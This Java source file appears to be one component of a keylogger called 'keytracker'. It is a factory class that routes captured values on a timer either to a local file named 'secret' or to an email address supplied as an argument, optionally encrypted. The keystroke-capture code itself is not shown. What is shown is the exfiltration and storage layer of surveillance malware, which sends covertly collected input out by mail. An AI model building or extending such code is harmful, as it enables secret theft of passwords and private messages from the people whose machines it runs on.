package com.keytracker;

import com.keytracker.encrypt.Encryptor;
import com.keytracker.file.*;
import com.keytracker.mail.MailSender;
import com.keytracker.storing.BundledStoreMechanism;
import com.keytracker.storing.SingleStoreMechanism;
import com.keytracker.storing.StoreMechanism;
import com.keytracker.storing.StoreParameters;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class MechanismsFactoryImpl implements MechanismsFactory {
    private final ArgsResolver argsResolver;
    private final MailSender mailSender;

    public MechanismsFactoryImpl(ArgsResolver argsResolver, MailSender mailSender) {
        this.argsResolver = argsResolver;
        this.mailSender = mailSender;
    }

    @Override
    public StoreMechanism getBundledStoreMechanism(ValueProvider valueProvider, Encryptor encryptor) {
        StoreMechanism storeMechanism = createBundledStoreMechanism(valueProvider, new StoreParameters(15, 15, TimeUnit.SECONDS));

        if (argsResolver.isFileArgPresent()) {
            registerFileWriter(storeMechanism, encryptor);
        }
        if (argsResolver.isMailArgPresent()) {
            registerMailWriter(storeMechanism, encryptor);
        }
        if (!argsResolver.isMailOrFileArgPresent()) {
            registerFileWriter(storeMechanism, encryptor);

        }

        return storeMechanism;
    }

    @Override
    public List<StoreMechanism> getSingleStoreMechanisms(ValueProvider valueProvider, Encryptor encryptor) {
        List<StoreMechanism> storeMechanisms = new ArrayList<>();

        if (argsResolver.isFileArgPresent()) {
            StoreMechanism storeMechanism = createSimpleStoreMechanism(valueProvider, new StoreParameters(15, 15, TimeUnit.SECONDS));
            registerFileWriter(storeMechanism, encryptor);
            storeMechanisms.add(storeMechanism);
        }
        if (argsResolver.isMailArgPresent()) {
            StoreMechanism storeMechanism = createSimpleStoreMechanism(valueProvider, new StoreParameters(1, 1, TimeUnit.MINUTES));
            registerMailWriter(storeMechanism, encryptor);
            storeMechanisms.add(storeMechanism);
        }
        if (!argsResolver.isMailOrFileArgPresent()) {
            StoreMechanism storeMechanism = createSimpleStoreMechanism(valueProvider, new StoreParameters(15, 15, TimeUnit.SECONDS));
            registerFileWriter(storeMechanism, encryptor);
            storeMechanisms.add(storeMechanism);
        }

        return storeMechanisms;
    }

    private void registerFileWriter(StoreMechanism storeMechanism, Encryptor encryptor) {
        Writer writer = argsResolver.isCryptArgPresent() ? new EncryptedFileWriter("secret", encryptor) : new MyFileWriter("secret");

        storeMechanism.registerWriter(writer);
    }

    private void registerMailWriter(StoreMechanism storeMechanism, Encryptor encryptor) {
        Writer writer = argsResolver.isCryptArgPresent() ? new EncryptedMailWriter(mailSender, argsResolver.getEmail(), encryptor) : new MyMailWriter(mailSender, argsResolver.getEmail());

        storeMechanism.registerWriter(writer);
    }

    private StoreMechanism createSimpleStoreMechanism(ValueProvider valueProvider, StoreParameters storeParameters) {
        return new SingleStoreMechanism(valueProvider, storeParameters);
    }

    private StoreMechanism createBundledStoreMechanism(ValueProvider valueProvider, StoreParameters storeParameters) {
        return new BundledStoreMechanism(storeParameters, valueProvider);
    }
}
